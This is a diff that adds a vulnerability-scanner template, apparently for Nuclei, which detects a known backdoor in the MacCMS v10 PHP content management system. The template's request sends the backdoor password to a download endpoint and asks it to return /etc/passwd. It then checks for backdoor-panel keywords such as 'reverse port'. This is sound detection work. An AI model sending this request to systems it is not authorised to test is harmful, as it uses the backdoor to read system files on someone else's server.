@@ -1,0 +1,35 @@
+id: maccmsv10-backdoor
+info:
+  name: Maccmsv10 Backdoor
+  author:
+  - l0ne1y
+  description: |-
+    maccms V10后门
+    Maccms是一套基于PHP的影视内容管理系统（CMS）。
+
+    MacCMS v10 源码可能存在后门程序，攻击者可以通过该后门程序获取服务器控制权限。
+  severity: critical
+  remediation: |-
+    临时修复方案：
+    1、删除后门文件
+    2、对系统进行全面的安全检查
+    3、修改系统所有用户密码
+requests:
+- matchers:
+  - type: word
+    condition: and
+    part: body
+    words:
+    - 扫描后门
+    - 反弹端口
+    - 文件管理
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1'
+  method: POST
+  body: getpwd=WorldFilledWithLove
+  headers:
+    Content-Type: application/x-www-form-urlencoded
